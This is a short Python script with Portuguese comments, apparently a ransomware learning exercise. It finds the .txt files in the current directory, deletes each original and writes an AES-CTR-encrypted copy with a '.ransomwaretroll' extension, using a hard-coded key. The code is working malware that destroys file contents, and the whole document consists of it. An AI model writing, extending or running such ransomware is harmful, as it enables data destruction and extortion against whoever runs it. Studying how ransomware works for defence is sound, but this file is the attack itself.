import os 
import pyaes
location = os.getcwd() # Pega o diretório atual


for file in os.listdir(location): #Pega todos os arquivos dentro do diretório
    try:
        if file.endswith(".txt"): #Separa apenas os arquivos terminados em .txt
            print ("Arquivo .txt encontrado:\t", file)
            file_opn = open(file, "rb")
            file_data = file_opn.read()
            file_opn.close()

            ## remover o arquivo
            os.remove(location+'/'+file)

            ## chave de criptografia
            key = b"testeransomwares"
            aes = pyaes.AESModeOfOperationCTR(key)

            ## criptografar o arquivo
            crypto_data = aes.encrypt(file_data)

            ## salvar o arquivo criptografado
            new_file = file + ".ransomwaretroll"
            new_file = open(f'{new_file}','wb')
            new_file.write(crypto_data)
            new_file.close()
    except Exception as e:
        raise e
        print ("Nenhum arquivo encontrado!")
     
print("Arquivos encriptados com sucesso!")